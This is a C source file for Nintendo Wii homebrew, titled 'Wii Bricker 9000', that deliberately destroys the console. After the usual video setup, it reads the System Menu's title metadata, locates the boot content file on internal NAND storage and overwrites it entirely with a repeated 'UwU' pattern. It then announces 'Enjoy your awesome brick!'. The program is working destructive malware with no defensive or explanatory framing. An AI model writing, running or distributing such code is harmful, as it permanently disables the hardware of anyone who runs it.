#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <wiiuse/wpad.h>
#include <sys/param.h>

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

//---------------------------------------------------------------------------------
int main(int argc, char **argv) {
//---------------------------------------------------------------------------------

	
	VIDEO_Init();

	
	WPAD_Init();

	ISFS_Initialize();

	
	rmode = VIDEO_GetPreferredMode(NULL);

	
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

	console_init(xfb,20,20,rmode->fbWidth,rmode->xfbHeight,rmode->fbWidth*VI_DISPLAY_PIX_SZ);

	
	VIDEO_Configure(rmode);

	VIDEO_ClearFrameBuffer(rmode, xfb, COLOR_BLUE);

	
	VIDEO_SetNextFramebuffer(xfb);

	
	VIDEO_SetBlack(FALSE);

	
	VIDEO_Flush();

	
	VIDEO_WaitVSync();
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();


	

	// printf("Hello World!");
	int conX, conY;
	CON_GetMetrics(&conX, &conY);

	puts("\x1b[41;1m\tWii Bricker 9000 Random Version");
	for (int i = 0; i < conX; i++)
		putchar('=');

	uint32_t tmdsize = 0;
	int ret = ES_GetStoredTMDSize(0x100000002LL, &tmdsize);
	if (ret < 0) {
		printf("Failed to get system menu tmd size! (%i)\n", ret);
		return ret;
	}

	signed_blob* s_tmd = memalign(0x20, tmdsize);
	if (!s_tmd) {
		puts("Out of memory!");
		return -12;
	}

	ret = ES_GetStoredTMD(0x100000002LL, s_tmd, tmdsize);
	if (ret < 0) {
		printf("Failed to get system menu tmd! (%i)\n", ret);
		return ret;
	}

	tmd* sm_tmd = SIGNATURE_PAYLOAD(s_tmd);

	uint32_t bootIndexCID = 0;
	size_t bootIndexSize = 0;
	for (int i = 0; i < sm_tmd->num_contents; i++) {
		tmd_content* con = sm_tmd->contents + i;
		if (con->index == sm_tmd->boot_index) {
			bootIndexCID = con->cid;
			bootIndexSize = con->size;
		}
	}

	if (!bootIndexCID) {
		puts("Failed to identify boot content!");
		return -2;
	}

	char filepath[ISFS_MAXPATH];
	sprintf(filepath, "/title/00000001/00000002/content/%08x.app", bootIndexCID);
	int fd = ret = ISFS_Open(filepath, ISFS_OPEN_WRITE);
	if (ret < 0) {
		printf("Failed to open boot content! (%i)\n", ret);
		return ret;
	}

	printf("\tCorrupting %s...\n\n", filepath);

	const char pattern[0x4000];
	const char str[] = "UwU";
	for (char* ptr = pattern; ptr < (pattern + sizeof(pattern)); ptr += sizeof(str))
		memcpy(ptr, str, sizeof(str));

	while (bootIndexSize) {
		ret = ISFS_Write(fd, pattern, MIN(sizeof(pattern), bootIndexSize));
		if (ret <= 0)
			break;

		bootIndexSize -= ret;
	}

	printf("\tDone! Enjoy your awesome brick! %.*s\n", sizeof(pattern), pattern);



	while(1) {

		
		WPAD_ScanPads();

		
		u32 pressed = WPAD_ButtonsDown(0);

		
		if ( pressed & WPAD_BUTTON_HOME ) exit(0);

		
		VIDEO_WaitVSync();
	}

	return 0;
}
